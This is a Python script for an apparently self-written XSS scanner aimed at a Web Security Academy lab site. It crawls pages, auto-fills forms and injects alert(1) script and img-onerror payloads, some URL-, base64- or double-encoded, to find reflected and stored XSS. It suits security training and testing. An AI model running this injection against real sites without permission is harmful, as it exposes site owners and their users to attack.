import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
import subprocess
import json
import re
import base64
from submitFile import fill_form
from checkAlert import test_alert
import string
import random
import rstr
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

visited = []

def get_url_without_params(url):
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    for param in query_params:
        query_params[param] = ['']
    new_query = urlencode(query_params, doseq=True)
    new_url = urlunparse(parsed._replace(query=new_query))
    return new_url

def all_links_without_params(all_links):
    new_all_links = []
    for link in all_links:
        new_link = get_url_without_params(link)
        new_all_links.append(new_link)
    return new_all_links

def get_links(base_url):
    # get all the pages which are statically from the web code
    all_links = [base_url]
    urls = [base_url] #change to a set
    for i, url in enumerate(urls):
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        for tag in soup.find_all('a',  href=True):
            #print("got a tag")
            link = tag['href']
            full_link = urljoin(base_url, link)
            #print("full_link: ", full_link)
            #print("urlparse(base_url).netloc = ", urlparse(base_url).netloc)
            #print("urlparse(full_link).netloc = ", urlparse(full_link).netloc)
            if full_link not in all_links and urlparse(base_url).netloc == urlparse(full_link).netloc:
                params = parse_qs(urlparse(full_link).query)
                #print("parmas: ", params.keys())
                to_add = True
                for link in all_links: #not putting in pages which only differ in the value of the params
                    parsed_url = urlparse(link)
                    captured_value = parse_qs(parsed_url.query)
                    #print("captured_value: ", captured_value.keys())
                    #print("urlparse(full_link).netloc: ", urlparse(full_link).netloc, " urlparse(link).netloc: ", urlparse(link).netloc)
                    parsed_link = urlparse(full_link)
                    if captured_value.keys() == params.keys() and urljoin(full_link, parsed_link.path) == urljoin(link ,parsed_url.path):
                        to_add = False
                if to_add:
                    all_links.append(full_link)
        urls.__delitem__(i)
    #print("got all pages statically")

    urls_and_values = {} # a dictionary that contains for each url where did I put input
    # get the pages the web redirects to using input from user (uses playwright library)
    for url in all_links:
        parsed_url = urlparse(url)
        headers = {'Referer': url,
                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                    'Host': parsed_url.netloc}
        session = requests.Session()
        response = session.get(url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        input_pages = soup.find_all('input')
        if input_pages:
            # we want to mimic a POST request to check if there are any other pages
            another_url, url1, values = check_stored_inputs(url)
            #print("url = ", url, " and the values I put are: ", values)
            urls_and_values[url1] = values
            new_url = get_url_without_params(another_url)
            if new_url not in all_links_without_params(all_links):
                #print("stripped = ", new_url, " url = ", another_url)
                all_links.append(another_url)

    return all_links, urls_and_values
def find_vuln(links):
    dict = {}
    for url in links:
        dict[url] = []
        #print(type(url))
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        search_pages = soup.find_all('section', class_="search")
        if search_pages:
            dict[url].append("search")
        comment_pages = soup.find_all('section', class_="comment")
        if comment_pages:
            dict[url].append("comment")
        if '?' in url:
            dict[url].append("params in url")
        if soup.find_all("input"):
            dict[url].append("input")
    return dict

def random_string(length):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def generate_random_url():
    # Random subdomain and domain
    subdomain = random_string(random.randint(3, 8))
    domain = random_string(random.randint(3, 6))
    tld = random.choice(["com", "net", "org", "io", "dev"])

    # Random path
    path = "/".join([random_string(random.randint(3, 10)) for _ in range(random.randint(1, 3))])

    # Random query string
    query = "&".join([f"{random_string(5)}={random_string(5)}" for _ in range(random.randint(0, 3))])

    # Assemble the URL
    url = f"https://{subdomain}.{domain}.{tld}/{path}"
    if query:
        url += f"?{query}"
    return url

def check_type_render_input(input_tag):
    if input_tag.has_attr('type'):
        type = input_tag['type']
        if input_tag.has_attr('pattern'):
            pattern = input_tag['pattern']
            text = rstr.xeger(pattern) # generate a random string based on the pattern it should have
        else:
            if type == "hidden":
                if input_tag.has_attr('value'):
                    text = input_tag['value']
            elif type == "email":
                text1 = ''.join(
                    random.choices(string.ascii_uppercase + string.digits, k=8))
                text = text1 + '@gmail.com'
            elif type == "url":
                text = generate_random_url()
            elif type == "number":
                text = ''.join(random.choices(string.digits, k=8))
            else:
                text = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    else:
        if input_tag.has_attr('placeholder'):
            text = input_tag['placeholder']
        else:
            text = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    return text

def check_stored_inputs(url, encoding_method="", check_script=False, check_imgonerror=False, double_encoding=False, single_encoding=False):
    text = ''
    if check_script:
        text = '<script>alert(1)</script>'
    elif check_imgonerror:
        text = '<img src=1 onerror=alert(1)>'

    if encoding_method == "url":
        text = quote(text)
        if double_encoding:
            text = quote(text)
    elif encoding_method == "base64":
        text = base64.b64encode(text.encode()).decode()
        if double_encoding:
            text = base64.b64encode(text.encode()).decode()
    elif encoding_method != "":
        text = text.encode(encoding=encoding_method, errors="ignore").decode(encoding=encoding_method, errors="ignore")

    if double_encoding and encoding_method != "" and encoding_method != "base64" and encoding_method != "url": #need to double encode
        text = text.encode(encoding=encoding_method,errors="ignore").decode(encoding=encoding_method, errors="ignore")

    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    form_tags = soup.find_all("form")
    for tag in form_tags:
        method = tag["method"]
        fields_to_fill = []
        values = []
        input_tags = tag.find_all("input")
        textarea_tags = tag.find_all("textarea")
        #print("form_tag: ")
        #print(input_tags)
        for input_tag in input_tags:
            list_to_append = []
            types_and_values = []

            list_to_append.append('input')
            list_to_append.append(input_tag['name'])
            if input_tag.has_attr('type'):
                if input_tag['type'] != "hidden":
                    list_to_append.append(0) # 0 = not hidden -> hidden means that the user can not input anything so its irelevant
                else:
                    list_to_append.append(1) # 1 = hidden
            else:
                list_to_append.append(0)

            if not check_script and not check_imgonerror:
                text = check_type_render_input(input_tag)
            types_and_values.append(text)

            if list_to_append:
                fields_to_fill.append(list_to_append)
            if types_and_values:
                values.append(types_and_values[0])

        for textarea_tag in textarea_tags:
            list_to_append = []
            types_and_values = []
            if (not textarea_tag.has_attr('type')) or (textarea_tag.has_attr('type') and textarea_tag['type'] != "hidden"):
                list_to_append.append('textarea')
                list_to_append.append(textarea_tag['name'])
            if textarea_tag.has_attr('type'):
                if textarea_tag['type'] != "hidden":
                    list_to_append.append(0) # 0 = not hidden
                else:
                    list_to_append.append(1) # 1 = hidden
            else:
                list_to_append.append(0)

            if not check_script and not check_imgonerror:
                text = check_type_render_input(textarea_tag)
            types_and_values.append(text)
            if list_to_append:
                fields_to_fill.append(list_to_append)
            if types_and_values:
                values.append(types_and_values[0])
        button = tag.find('button')
        final_url = fill_form(url, fields_to_fill, values, button, method)

        all_values = {}
        #print(fields_to_fill, types_and_value)
        for field, val in zip(fields_to_fill, values):
            all_values[field[1]] = val
        #print("url = ", url, " and the values I put are: ", all_values)
        return final_url, url, all_values

def run_submit_form(buttonSelector, url, fields_to_fill, values):
    try:
        #print("button = ", buttonSelector)
        result = subprocess.run(['node', 'submitForm.js', url, json.dumps(fields_to_fill), json.dumps(values), buttonSelector],
                                capture_output=True,
                                text=True,
                                check=True
                                )
        return json.loads(result.stdout)
    except subprocess.CalledProcessError as e:
        print("Error running Node.js script:", e.stderr)
        return None

def search_for_attr(url):
    #print("url with params: ", url)
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    script_tags = soup.find_all("script")
    results = []
    pattern = re.compile(r"\.attr\s*\(\s*(['\"])([^'\"]*)\1\s*(?:,\s*(['\"])([^'\"]*)\3)?\s*\)",re.MULTILINE)

    for idx, tag in enumerate(script_tags):
        text = tag.get_text()

        matches = pattern.findall(text)
        #print("tag = ", tag, ", text = ", text)
        if matches:
            extracted = []
            for (q1, key, q2, val) in matches:
                if val:
                    extracted.append((key, val))
                else:
                    extracted.append((key, None))
            results.append((idx, extracted))

        return results

#get all the srcs of a certain page
def get_all_srcs(url):
    srcs = []
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    script_tags = soup.find_all("script")
    for tag in script_tags:
        if tag.has_attr("src"):
            src = tag["src"]
            if src[0] == "/" and ".js" in src: #check if the src is inside the website and if its a js file
                srcs.append(src)

    #print("srcs of the page: ", srcs)
    return srcs

#read each file and check if it consists of functions which alter any DOM elements
def check_the_srcs(srcs, base_url):
    for src in srcs:
        #print("base_url = ", base_url)
        js_url = urljoin(base_url, src)
        print("url of js file: ", js_url)
        response = requests.get(js_url)
        #soup = BeautifulSoup(response.text, 'html.parser')
        #pre_tag = soup.find("pre")
        #content = pre_tag.get_text()
        print("content of js file: ", response.text)

def check_reflected_xss(url):
    #print("values: ", values)
    print(f"checked reflected XSS in {url}: ")
    encoding_methods = ["ascii", "utf-8", "utf-16", "utf-32", "base64", "url"]
    parsed = urlparse(url)
    all_params = parse_qs(parsed.query)
    for param in all_params:
        val = ''.join(random.choices(string.digits, k=8))
        all_params[param] = val
        new_query = urlencode(all_params, doseq=True)
        new_url = urlunparse(parsed._replace(query=new_query))
        res = requests.get(new_url)
        escaped_val = re.escape(val)
        found_in_web = re.search(escaped_val, res.text)

        if found_in_web:
            val = "<script>alert(1)</script>"
            all_params[param] = val
            new_query = urlencode(all_params, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))
            if test_alert(new_url):
                print(f"Checked {url} for reflected XSS.\nEntered '<script>alert(1)</script>' in {param}."
                      f"\nGot alert - url exposed to reflected XSS.")
                return
            val = "<img onerror=alert(1)>"
            all_params[param] = val
            new_query = urlencode(all_params, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))
            if test_alert(new_url):
                print(
                    f"Checked {url} for reflected XSS.\nEntered '<img onerror=alert(1)>' in {param}."
                    f"\nGot alert - url exposed to reflected XSS.")
                return

            for method in encoding_methods:
                text = '<script>alert(1)</script>'
                if method == "url":
                    text = quote(text)
                else:
                    if method == "base64":
                        text = base64.b64encode(text.encode()).decode()
                    else:
                        text = text.encode(encoding=method, errors="ignore").decode(encoding=method, errors="ignore")
                all_params[param] = text
                new_query = urlencode(all_params, doseq=True)
                new_url = urlunparse(parsed._replace(query=new_query))
                if test_alert(new_url):
                    print(
                        f"Checked {url} for reflected XSS.\nEntered '<script>alert(1)</script>' in {param}."
                        f"\nUsed single encoding.\n"
                        f"method: {method}"
                        f"\nGot alert - url exposed to reflected XSS.")
                    return
            for method in encoding_methods:
                text = '<script>alert(1)</script>'
                if method == "url":
                    text = quote(text)
                    text = quote(text)
                else:
                    if method == "base64":
                        text = base64.b64encode(text.encode()).decode()
                        text = base64.b64encode(text.encode()).decode()
                    else:
                        text = text.encode(encoding=method, errors="ignore").decode(encoding=method, errors="ignore")
                        text = text.encode(encoding=method, errors="ignore").decode(encoding=method, errors="ignore")
                all_params[param] = text
                new_query = urlencode(all_params, doseq=True)
                new_url = urlunparse(parsed._replace(query=new_query))
                if test_alert(new_url):
                    print(
                        f"Checked {url} for reflected XSS.\nEntered '<script>alert(1)</script>' in {param}."
                        f"\nUsed double encoding.\n"
                        f"method: {method}"
                        f"\nGot alert - url exposed to reflected XSS.")
                    return

        else:
            print(f""
                  f"The {param} parameter does not affect the web code.")

def check_stored_xss(url):
    # use check_stored_input
    result = check_stored_inputs(url)
    found_vals = {}
    if result is not None:#check in all the pages if the value e entered exists
        final_url, curr_url, all_values = result
        print(f"The url we got: {final_url}, the url we entered: {url}, the values: {all_values}")

        for key, value in all_values.items():
            res = requests.get(curr_url)
            escaped_val = re.escape(value)
            found_in_web = re.search(escaped_val, res.text)
            if found_in_web:
                encoded = False
                double_encoded = False
                alert = False
                val = value # the value we entered to the key, if it was encoded,
                # if it was double encoded, if it caused alert

                #key = [k for k, v in all_values.items() if v == value][0]
                print(f"found {value} in {url}. we entered it in {key} tag.")
                final_url, curr_url, all_values = check_stored_inputs(url, check_script=True)
                if test_alert(curr_url):
                    print(f"Got alert in {url}. We entered <script>alert(1)</script> in {key}.")
                    val = "<script>alert(1)</script>"
                    alert = True

                elif test_alert(check_stored_inputs(url, check_imgonerror=True)[1]):
                    print(f"Got alert in {url}. We entered <img src=1 onerror=alert(1)> in {key}.")
                    val = "<img src=1 onerror=alert(1)>"
                    alert = True

                else:  # try the single encoding method
                    encoding_methods = ["ascii", "utf-8", "utf-16", "utf-32", "base64", "url"]
                    got_xss = False
                    for method in encoding_methods:
                        new_url = check_stored_inputs(url, encoding_method=method, check_script=True,
                                                      check_imgonerror=False, single_encoding=True)[1]
                        alerted = test_alert(new_url)
                        if alerted:
                            #print("got xss in url: ", new_url)
                            alert = True
                            encoded = True
                            val = "<script>alert(1)</script>"
                            got_xss = True
                            break

                    if not got_xss:
                        # try double encoding
                        for method in encoding_methods:
                            new_url = check_stored_inputs(url, encoding_method=method, check_script=True,
                                                          check_imgonerror=False, double_encoding=True)[1]
                            alerted = test_alert(new_url)
                            if alerted:
                                #print("got xss in url: ", new_url)
                                alert = True
                                double_encoded = True
                                val = "<script>alert(1)</script>"
                                break
                found_vals[key] = (val, encoded, double_encoded, alert)

    #check in all the pages if it exists
    #if it does exist - check for alert
    #the alert should be in the page where we entered the input
    return found_vals
def identify_vuln_places(urls: dict, urls_and_values: dict):
    for url in urls.keys():
        #print("the url checking: ", url)
        check_reflected_xss(url)
        dict_values = check_stored_xss(url)
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("tag", style="cyan", no_wrap=True)
        table.add_column("input", style="white")
        table.add_column("encoded", style="dim")
        table.add_column("double encoded", style="dim")
        table.add_column("alerted", style="dim")

        for key, value in dict_values.items():
            input, encoded, double, alerted = value
            table.add_row(key, input, encoded, double, f"[green]{alerted}")
        console = Console()
        console.print(table)

if __name__ == '__main__':
    url = 'https://0ad5006d032329fb81d017a000970048.web-security-academy.net/'
    print("[Evaluating]")

    pages, urls_and_values = get_links(url)
    #print(urls_and_values)
    for url in pages:
        parsed_url = urlparse(url)
        captured_value = parse_qs(parsed_url.query)
        #print(captured_value.keys())
    #print("got ", len(pages), " pages")
    #print("all the pages of the website: ", find_vuln(pages))

    dict_pages = find_vuln(pages) #returns a dictionary in which for each page (the key) the value is what places are exposed to XSS vulnerablility
    #print("urls_and_values = ", urls_and_values)
    identify_vuln_places(dict_pages, urls_and_values)


